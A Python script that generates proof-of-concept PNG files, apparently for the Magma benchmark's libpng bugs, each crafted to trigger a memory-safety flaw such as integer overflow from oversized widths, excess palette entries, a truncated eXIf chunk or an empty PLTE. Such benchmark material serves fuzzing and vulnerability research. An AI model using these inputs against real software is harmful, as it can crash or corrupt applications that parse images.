#!/usr/bin/env python3
"""Write one PoC PNG per magma libpng bug into argv[1].

harness_0: PNG001 003 004 006 007   harness_1: PNG005   harness_2: PNG002 (any input), PNG007 (png007_rgba)
"""
import os
import struct
import sys
import zlib
out = sys.argv[1]
def chunk(t, d, length=None):
    l = len(d) if length is None else length
    return struct.pack(">I", l) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
SIG = b"\x89PNG\r\n\x1a\n"
def ihdr(w, h, bd, ct, il=0):
    return chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, bd, ct, 0, 0, il))
IEND = chunk(b"IEND", b"")
def idat(raw): return chunk(b"IDAT", zlib.compress(raw, 9))
def w(name, data):
    open(os.path.join(out, name), "wb").write(data)

# PNG001: RGB8, width*3+1 == 2^32
w("png001.png", SIG + ihdr(0x55555555, 1, 8, 2) + idat(b"\0" * 16) + IEND)
# PNG003: 1-bit palette, 3 PLTE entries (> 1<<1)
w("png003.png", SIG + ihdr(1, 1, 1, 3) + chunk(b"PLTE", b"\0\0\0\xff\xff\xff\x80\x80\x80") + idat(b"\0\0") + IEND)
# PNG004: interlaced 1-bit gray, width 2^29+1; only pass-0 row 0 data
W = (1 << 29) + 1
p0 = (W + 7) // 8
w("png004.png", SIG + ihdr(W, 1, 1, 0, 1) + idat(b"\0" * (1 + (p0 + 7) // 8)) + IEND)
# PNG005: 1-bit gray 16x1, no transforms (harness_1)
w("png005.png", SIG + ihdr(16, 1, 1, 0) + idat(b"\0\0\0") + IEND)
# PNG006: eXIf truncated mid-data
w("png006.png", SIG + ihdr(1, 1, 8, 0) + struct.pack(">I", 100) + b"eXIf" + b"MM\0\x2a" + b"\0" * 10)
# PNG007: palette image, zero-length PLTE
w("png007.png", SIG + ihdr(1, 1, 8, 3) + chunk(b"PLTE", b"") + idat(b"\0\0") + IEND)
# PNG002: any valid image
w("png002.png", SIG + ihdr(2, 2, 8, 2) + idat(b"\0" + b"\x10" * 6 + b"\0" + b"\x20" * 6) + IEND)
# PNG007 via simplified API: trailing 0 byte selects PNG_FORMAT_RGBA in harness_2
w("png007_rgba.png", SIG + ihdr(1, 1, 8, 3) + chunk(b"PLTE", b"") + idat(b"\0\0") + IEND + b"\0")
